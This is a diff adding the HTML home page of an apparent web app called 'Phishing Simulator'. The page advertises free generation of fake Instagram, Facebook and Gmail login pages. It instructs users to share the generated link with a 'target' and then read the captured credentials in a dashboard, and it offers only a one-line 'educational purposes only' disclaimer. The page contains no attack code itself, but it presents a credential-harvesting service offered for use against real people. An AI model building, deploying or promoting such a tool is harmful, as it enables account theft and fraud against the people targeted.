@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='favicon.png')}}">
+<link rel="stylesheet" type="text/css" href="nav.css">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+<head>
+    <title>Phishing Simulator</title>
+    <script src="nav.js"></script>
+    <style>
+  h4 a{
+    box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);
+  }
+</style>
+
+    <script th:inline="javascript">
+        /* Access JWT token from model */
+        var jwtToken = [[${jwtToken}]];
+
+        /* Save JWT token on user side as needed */
+        // For example, you can use localStorage
+        localStorage.setItem('jwtToken', jwtToken);
+    </script>
+
+</head>
+
+
+
+
+<body style="background-color: #EEE2DC; color: #AC3B61;">
+
+
+<div class="topnav" style="margin:auto;">
+
+    <a class="active" href="#home">Home</a>
+    <a href="/apps">Apps</a>
+    <a  href="/dashboard">Dashboard</a>
+
+    <div >
+        <input type="submit" id="logout_button" class="btn btn-danger"
+               th:if="${isLogged}"
+               value="Logout" th:onclick="logout()">
+        </input>
+
+<!--        <input type="submit" id="login_button" class="btn btn-info"-->
+<!--               th:value="${isLogged ? uid : 'Login'}"-->
+<!--               th:onclick="${isLogged ? 'see_user()' : 'login()'}">-->
+<!--        </input>-->
+    </div>
+
+
+</div>
+
+<center style=" color: rgb(43, 15, 126); margin:auto;">
+
+    <h3 th:if="${isLogged}" style="width: fit-content; box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);" >
+        Welcome &#127882 <span th:text="${username}"></span> &#127882</h3>
+
+    <h3 th:unless="${isLogged}" style="background-color: #ddf1ae; width: fit-content; box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);">
+        Welcome to Phishing Simulator</h3>
+
+    ! Made it for educational purposes only !
+</center>
+<br>
+
+<div style="display: inline-flex;">
+    <h4 style="float: left;">This WebApp is capable to make a Phishing page for sites like Instagram, Facebook, Gmail for you.
+        <div style="float: right; margin-top: 20px; margin-right: 5px;"> Like this  &#128073;
+        </div>
+
+        <center style="margin-top: 10px; color: black;"><b> FREE</b> </center>
+        <br>
+        You just have to <a href="/register" >make an account</a> then go to <a href="/apps">Apps</a> section.
+        <br>
+        <br>
+        Choose the app and share the generated link to target &#129333;.
+        <br>
+        <br>
+
+        You Can see &#128064; the the Credential of target in <a href="/dashboard" >Dashboard</a>
+    </h4>
+    <div>
+        <img src="/static/instagram/insta_demo.PNG" alt="insta demo" onclick="window.open('/instagram.com','_self');" width="120" height="160" style="margin-right: 10px;margin-top: 20px; float: right; cursor: pointer; box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);">
+        <img src="/static/facebook/facebook_demo.PNG" alt="insta demo" onclick="window.open('/facebook.com','_self');" width="120" height="160" style="margin-right: 10px;margin-top: 20px; float: right; cursor: pointer; box-shadow: 0 12px 16px 0 rgba(0,0,0,0.24), 0 17px 50px 0 rgba(0,0,0,0.19);">
+    </div>
+</div>
+
+
+
+
+
+<footer style=" position: fixed; left: 50%; bottom: 20px; transform: translate(-50%, -50%); margin: 0 auto;">
+
+    <center><input type="submit" onclick="window.open('/contactus','_self')" value="Contact Us"></input></center>
+    <center><p>Phishing Simulator</p></center>
+    <center><p>@2024</p></center>
+</footer>
+</body>
+</html>
+
+
+
+
+
